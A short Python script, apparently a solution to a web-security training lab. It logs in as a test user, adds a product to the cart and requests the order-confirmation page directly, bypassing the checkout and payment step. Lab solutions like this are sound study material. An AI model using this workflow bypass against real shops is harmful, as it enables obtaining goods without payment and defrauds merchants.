import requests
import re




# Disable certificate warnings
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

session = requests.Session()

# Use Burp proxy if needed
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

# Take URL input

app_url = input("Enter your url :  ").strip()

# To find the csrf token from url 

csrf_token = session.get(app_url+"/login",verify=False,proxies=proxies)
token = re.search(r'name="csrf" value="(.*?)"',csrf_token.text).group(1)  # to find the csrf toke
print(f"/login csrf token is {token}")

data = {"username":"wiener","password":"peter","csrf":token}  # 
wiener_login = session.post(app_url+"/login",verify=False,data=data,proxies=proxies)

add_cart = {"productId":"1","redir":"PRODUCT","quantity":"1"}  # adding jacket to the cart
add_product = session.post(app_url+"/cart",verify=False,proxies=proxies,data=add_cart)

confirm_product = session.get(app_url+"/cart/order-confirmation?order-confirmation=true",proxies=proxies,verify=False)